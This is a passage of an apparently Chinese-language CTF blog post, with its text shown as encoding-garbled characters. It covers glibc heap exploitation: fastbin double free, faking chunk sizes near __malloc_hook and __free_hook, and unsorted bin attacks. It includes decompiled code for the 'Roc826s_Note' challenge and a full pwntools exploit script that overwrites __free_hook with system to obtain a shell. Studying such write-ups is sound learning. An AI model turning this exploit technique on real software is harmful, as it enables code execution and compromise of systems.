<li><p>å½“å­˜åœ¨uafæ¼æ´ï¼Œä½†æ˜¯ç¨‹åºä¸­ä¸å­˜åœ¨editè¿™æ ·çš„åŠŸèƒ½ï¼Œä¹Ÿå°±æ˜¯è¯´å †ä¸­çš„å†…å®¹æ˜¯åœ¨åˆ›å»ºè¯¥å †æ—¶ä¸€å¹¶è¾“å…¥åˆ°å †ä¸­çš„ï¼Œè¿™ç§æƒ…å†µä¸‹å°±å¯ä»¥æ„é€ double freeæ¥ä¿®æ”¹fdæŒ‡é’ˆè¿›è¡Œå †å—çš„ä¼ªé€ </p>
</li>
<li><p>fast binæœ‰ä¸€ä¸ªæ£€æŸ¥ï¼šå½“ä»ä¸€ä¸ªfast biné“¾è¡¨ä¸­å–å‡ºå †å—æ—¶ï¼Œä¼šæ£€æŸ¥è¯¥å–å‡ºçš„å †å—çš„sizeä½æ˜¯å¦ä¸è¯¥fast biné“¾è¡¨æ‰€å¯¹åº”çš„å¤§å°ä¸€è‡´ï¼Œæ£€æŸ¥ä¸é€šè¿‡å°±ä¼šæŠ¥é”™ã€‚è¿™å¸¦æ¥çš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯æˆ‘ä»¬ä¸èƒ½ç›´æ¥è®©fdæŒ‡é’ˆæŒ‡å‘ä»»æ„ä½ç½®ç„¶åæŠŠè¿™ä¸ªä¼ªé€ çš„å †å—ä»fast binä¸­å–å‡ºï¼Œæˆ‘ä»¬è¿˜éœ€è¦ä¼ªé€ å †å—çš„sizeä½æ‰èƒ½å°†å…¶æˆåŠŸmallocå‡ºæ¥ã€‚</p>
<p>ç»“åˆå›¾ç‰‡è¯´å…·ä½“ä¸€ç‚¹ï¼Œä¾‹å¦‚æˆ‘ä»¬ç°åœ¨é€šè¿‡æŸç§æ–¹æ³•å°†ä¿å­˜0x70å¤§å°çš„chunkçš„fast binæ„é€ æˆå¦‚ä¸‹ï¼š</p>
<img src="/2022/04/23/%E5%87%A0%E9%81%93%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/%E7%9F%A5%E8%AF%86%E7%82%B9-1.jpg" class>

<p>è¿™é‡Œåªæ˜¯ä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘å°†<code>0xbfe0c0</code>ä½ç½®çš„å †å—çš„<code>fd</code>æŒ‡é’ˆæŒ‡å‘äº†<code>__malloc_hook - 0x10</code>çš„ä½ç½®ï¼Œæ˜¾ç„¶æˆ‘ä»¬æœ€åçš„ç›®çš„æ˜¯åœ¨<code>__malloc_hook - 0x10</code>å¤„ï¼ˆä¹Ÿå°±æ˜¯<code>__malloc_hook</code>é™„è¿‘ï¼‰ç”³è¯·å‡ºä¸€ä¸ªå †å—ï¼Œä»è€Œè®©æˆ‘ä»¬èƒ½å¤Ÿä¿®æ”¹<code>__malloc_hook</code>ä¸­çš„å†…å®¹ï¼Œç„¶è€Œæˆ‘ä»¬çœ‹çœ‹è¯¥ä½ç½®+ä¸€ä¸ªå­—é•¿å¤„çš„å€¼</p>
<img src="/2022/04/23/%E5%87%A0%E9%81%93%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/%E7%9F%A5%E8%AF%86%E7%82%B9-2.jpg" class>

<p>å› ä¸ºè¿™ä¸ªå€¼è·Ÿfast biné“¾è¡¨å¯¹åº”çš„å¤§å°ä¸åŒï¼Œæ‰€ä»¥è¿™ä¸ªä¼ªé€ çš„chunkæ˜¯æ— æ³•ç›´æ¥ç”³è¯·å‡ºæ¥çš„ï¼Œå½“æˆ‘ä»¬å°è¯•å°†å…¶ä»fast binä¸­mallocå‡ºæ¥æ—¶ï¼Œç¨‹åºå°±ä¼šæŠ¥é”™</p>
<img src="/2022/04/23/%E5%87%A0%E9%81%93%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/%E7%9F%A5%E8%AF%86%E7%82%B9-3.jpg" class>

<p>è§£å†³æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œæˆ‘ä»¬åªéœ€è¦å†ä¼ªé€ chunkçš„sizeä½å³å¯ï¼Œæˆ‘ä»¬è§‚å¯Ÿä¸€ä¸‹<code>__malloc_hook</code>é™„è¿‘çš„æ•°æ®</p>
<img src="/2022/04/23/%E5%87%A0%E9%81%93%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/%E7%9F%A5%E8%AF%86%E7%82%B9-4.jpg" class>

<p>ä¼šå‘ç°å°±æœ‰ä¸€äº›æ•°æ®é€‚åˆè®©æˆ‘ä»¬è¿›è¡Œä¼ªé€ ï¼Œæˆ‘ä»¬è°ƒå¥½é€‚å½“çš„åç§»ï¼Œè®©ä¼ªé€ çš„chunkçš„sizeä½æ­£å¥½ä¸º<code>0x7f</code>å°±èƒ½é€šè¿‡æ£€æŸ¥ï¼Œå› ä¸º<code>0x7f</code>æ­£å¥½åœ¨<code>0x70</code>çš„èŒƒå›´å†…ï¼Œå¹¶ä¸”<code>0x7f</code>çš„æœ€ä½ä¸€ä½æ˜¯1ã€‚</p>
<p>æˆ‘ä»¬è°ƒæ•´å¥½åç§»ä¹‹åå†æ¥çœ‹ä¸€ä¸‹ï¼š</p>
<img src="/2022/04/23/%E5%87%A0%E9%81%93%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/%E7%9F%A5%E8%AF%86%E7%82%B9-5.jpg" class>

<p>è¿™æ ·å°±å®Œæˆäº†sizeä½çš„ä¼ªé€ ï¼Œæˆ‘ä»¬å°±èƒ½æˆåŠŸåœ¨<code>__malloc_hook</code>é™„è¿‘ç”³è¯·å‡ºä¸€ä¸ªå †å—ï¼Œè¿›è€Œä¿®æ”¹<code>__malloc_hook</code></p>
<p>è¿™é‡Œè¿˜æ¶‰åŠåˆ°ä¸¤ä¸ªé—®é¢˜ï¼š</p>
<ul>
<li><p>åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­æˆ‘ä»¬çŸ¥é“<code>__malloc_hook</code>é™„è¿‘æ˜¯ä¼šæœ‰ç°æœ‰çš„æ•°æ®èƒ½è®©æˆ‘ä»¬å®Œæˆsizeä½çš„ä¼ªé€ çš„ï¼ˆç›®å‰åªçŸ¥é“libc-2.23å’Œlibc-2.27ä¼šæœ‰ï¼Œæ›´é«˜ç‰ˆæœ¬ä¸çŸ¥é“è¿˜æœ‰æ²¡æœ‰ï¼‰ï¼Œä½†æ˜¯æˆ‘ä»¬æŸ¥çœ‹<code>__free_hook</code>é™„è¿‘ï¼Œä¼šå‘ç°ä»€ä¹ˆéƒ½æ²¡æœ‰</p>
<img src="/2022/04/23/%E5%87%A0%E9%81%93%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/%E7%9F%A5%E8%AF%86%E7%82%B9-6.jpg" class>

<p>è¿™ä¹Ÿå°±è¯´æ˜æˆ‘ä»¬æ˜¯æ— æ³•ç›´æ¥åœ¨<code>__free_hook</code>é™„è¿‘å¾—åˆ°ä¸€ä¸ª<code>fast bin</code>å¤§å°çš„å †å—çš„ï¼Œæˆ‘ä»¬å¾—é€šè¿‡ä¸€äº›å…¶ä»–æ–¹æ³•ä½œä¸ºé“ºå«ï¼ˆä¾‹å¦‚unsorted bin attackï¼‰ï¼Œç„¶åæ‰èƒ½ç»§ç»­ä¸‹ä¸€æ­¥</p>
</li>
<li><p><code>__malloc_hook</code>çš„å‚æ•°æ˜¯æˆ‘ä»¬æ— æ³•ç›´æ¥æ§åˆ¶çš„ï¼ˆæˆ‘ç›®å‰çš„äº†è§£ï¼‰ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¦é€šè¿‡ä¿®æ”¹<code>__malloc_hook</code>æ¥æ‹¿shellçš„è¯åªèƒ½å°†å…¶æ”¹æˆone_gadgetæˆ–è€…åé—¨å‡½æ•°ï¼Œä½†æ˜¯<code>__free_hook</code>çš„å‚æ•°æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œå…¶ä¼šå°†ä¼ è¿›<code>free</code>å‡½æ•°çš„æŒ‡é’ˆæ¥ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªéœ€è¦åœ¨chunkçš„æ•°æ®åŒºå¼€å¤´å†™å…¥<code>/bin/sh</code>ï¼Œä¿®æ”¹<code>__free_hook</code>ä¸º<code>system</code>ä¹‹åå°†è¿™ä¸ªchunk freeæ‰å³å¯ã€‚</p>
</li>
</ul>
</li>
<li><p>tcacheè™½ç„¶æ˜¯å•å‘é“¾è¡¨ï¼Œä½†æ˜¯ä¼šå°†bkæŒ‡é’ˆæŒ‡å‘binå¤´ï¼Œå¹¶ä¸”ä¼š<strong>é€šè¿‡è¿™ä¸ªæŒ‡é’ˆæ¥æŸ¥æ‰¾å…¶æ‰€æŒ‡å‘çš„æ•´ä¸ªbiné“¾è¡¨ä¸­</strong>æœ‰æ— å’Œè¿™ä¸ªbkæŒ‡é’ˆæ‰€å±çš„chunkç›¸åŒçš„chunkï¼Œç®€å•ç‚¹è¯´å°±æ˜¯ä¸€ä¸ªåŠ å¼ºç‰ˆçš„double freeæ£€æŸ¥ã€‚ç»•è¿‡ä¹Ÿå¾ˆç®€å•ï¼Œåªéœ€è¦ä¿®æ”¹è¿™ä¸ªbkæŒ‡é’ˆå³å¯ã€‚</p>
</li>
</ol>
<h3 id="Roc826s-Note"><a href="#Roc826s-Note" class="headerlink" title="Roc826s_Note"></a>Roc826s_Note</h3><p>ç‰ˆæœ¬libc-2.23</p>
<p>è¿˜æ˜¯èœå•å †é¢˜ï¼Œä¸»è¦æ¶‰åŠå‡½æ•°å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-----------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.add&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.dele&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.show&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4.exit&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">putchar</span>(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">19</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;full!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !(&amp;<span class="built_in">list</span>)[i] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;size?&quot;</span>);</span><br><span class="line">  v2 = readi(<span class="string">&quot;size?&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt; <span class="number">0x90</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid size!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  (&amp;<span class="built_in">list</span>)[i] = <span class="built_in">malloc</span>(v2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">  read_n((&amp;<span class="built_in">list</span>)[i], v2);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;done!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">dele</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;index?&quot;</span>);</span><br><span class="line">  v1 = readi(<span class="string">&quot;index?&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (&amp;<span class="built_in">list</span>)[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((&amp;<span class="built_in">list</span>)[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;done!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid index!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;index?&quot;</span>);</span><br><span class="line">  v1 = readi(<span class="string">&quot;index?&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (&amp;<span class="built_in">list</span>)[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>((&amp;<span class="built_in">list</span>)[v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid index!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨dele()å‡½æ•°ä¸­å­˜åœ¨uafæ¼æ´ï¼Œå› ä¸ºæ²¡æœ‰å•ç‹¬çš„editåŠŸèƒ½ï¼Œæ‰€ä»¥éœ€è¦æ„é€ double freeæ¥ä¿®æ”¹fdæŒ‡é’ˆä¼ªé€ å †å—</p>
<p>å› ä¸ºé™åˆ¶ç”³è¯·çš„chunkæœ€å¤§å¤§å°ä¸º0x90ï¼Œæ‰€ä»¥èƒ½ç›´æ¥åˆ©ç”¨unsorted binæ¥æ³„æ¼libcåœ°å€</p>
<p>æ€è·¯ï¼š</p>
<ol>
<li>æ³„æ¼libcå’Œheap</li>
<li>ä¼ªé€ chunkä¿®æ”¹<code>__free_hook</code>/<code>__malloc_hook</code>å³å¯</li>
</ol>
<h4 id="ä¿®æ”¹-malloc-hook"><a href="#ä¿®æ”¹-malloc-hook" class="headerlink" title="ä¿®æ”¹__malloc_hook"></a>ä¿®æ”¹__malloc_hook</h4><p>æ³„æ¼libcåæ„é€ ä¸€ä¸ªdouble freeæ¥åœ¨<code>__malloc_hook</code>é™„è¿‘ç”³è¯·ä¸€ä¸ªå †å—å³å¯</p>
<h4 id="ä¿®æ”¹-free-hook"><a href="#ä¿®æ”¹-free-hook" class="headerlink" title="ä¿®æ”¹__free_hook"></a>ä¿®æ”¹__free_hook</h4><p>æ”¹<code>__free_hook</code>è¦ç¨å¾®éº»çƒ¦ç‚¹ï¼Œå¯ä»¥å…ˆåˆ©ç”¨unsorted bin attackåœ¨<code>__free_hook</code>é™„è¿‘å†™å…¥ä¸€ä¸ªlibcåœ°å€ï¼Œè¿™æ ·å°±èƒ½è®©<code>__free_hook</code>é™„è¿‘æœ‰å¯ç”¨çš„èƒ½å¤Ÿç”¨æ¥ä¼ªé€ sizeä½çš„æ•°æ®äº†(0x7f)</p>
<p>å…·ä½“ä¸€ç‚¹ï¼š</p>
<ol>
<li>æ³„æ¼libcå’Œheap</li>
<li>åœ¨unsorted bin chunkå‰é¢ç”³è¯·ä¸€ä¸ªå †å—ï¼Œä»è€Œä¿®æ”¹unsorted bin chunkçš„bkæŒ‡é’ˆæŒ‡å‘<code>__free_hook</code>é™„è¿‘</li>
<li>å°†è¿™ä¸ªunsorted bin chunk mallocå‡ºæ¥ï¼Œè¿™ä¸ªè§£é“¾çš„è¿‡ç¨‹ä¸­unsorted bin chunkå°±ä¼šå°†å…¶<code>fd</code>çš„å€¼å†™å…¥<code>bk-&gt;fd</code>ä¸­ï¼Œè¿™æ ·å°±ä½¿å¾—<code>__free_hook</code>é™„è¿‘å‡ºç°äº†å¯ç”¨çš„æ•°æ®</li>
<li>å†æ­£å¸¸åˆ©ç”¨double freeæ¥ä¼ªé€ å †å—ä»è€Œä¿®æ”¹<code>__free_hook</code>å³å¯</li>
</ol>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./Roc826&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./Roc826&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node4.buuoj.cn&quot;,28612)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recv(timeout = <span class="number">0.25</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;?&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;?&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">&#x27;\x71&#x27;</span>) <span class="comment">#è¿™é‡Œç”³è¯·ä¸€ä¸ªè·Ÿunsorted bin chunkç›¸é‚»çš„chunkï¼Œé€šè¿‡è¿™ä¸ªchunkæ¥ä¼ªé€ unsorted bin chunkçš„sizeä½</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;&#x27;</span>)	<span class="comment">#ç”³è¯·ä¸€ä¸ªunsorted bin chunk</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)	<span class="comment">#ç”³è¯·ä¸¤ä¸ªfast bin chunkå®ç°double free</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - (<span class="number">0x7f75f9240b78</span> - <span class="number">0x00007f75f8e7c000</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base = &quot;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line">sys = libc_base + (<span class="number">0x7f75f8ec13a0</span> - <span class="number">0x00007f75f8e7c000</span>)</span><br><span class="line">free_hook = libc_base + (<span class="number">0x7fd4270557a8</span> - <span class="number">0x7fd426c8f000</span>)</span><br><span class="line">arena = libc_base + (<span class="number">0x7f6553094b78</span> - <span class="number">0x7f6552cd0000</span>)	<span class="comment">#è¿™é‡Œçš„arenaæ˜¯æŒ‡unsorted binçš„binå¤´ä½ç½®</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x130</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap_base = &quot;</span>,<span class="built_in">hex</span>(heap_base)</span><br><span class="line">add(<span class="number">0x60</span>,p64(heap_base+<span class="number">0x20</span>))	<span class="comment">#è¿™é‡Œä¼ªé€ fdæŒ‡é’ˆ</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(arena) + p64(free_hook-<span class="number">0x40</span>))	<span class="comment">#è¿™é‡Œä¿®æ”¹unsorted bin chunkçš„bkæŒ‡é’ˆ</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#unsorted bin attack</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(free_hook-<span class="number">0x30</span>-<span class="number">3</span>))	<span class="comment">#è¿™é‡Œå¼€å§‹å†è¿›è¡Œä¸€æ¬¡å †å—çš„ä¼ªé€ å³å¯</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(<span class="number">0</span>)*<span class="number">4</span> + <span class="string">&#x27;\x00&#x27;</span>*<span class="number">3</span> + p64(sys))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="ä¸‹ä¸€é¡µ"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">John Doe</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">49</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">32</span>
        <span class="site-state-item-name">æ ‡ç­¾</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">John Doe</span>
</div>
  <div class="powered-by">ç”± <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> å¼ºåŠ›é©±åŠ¨
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
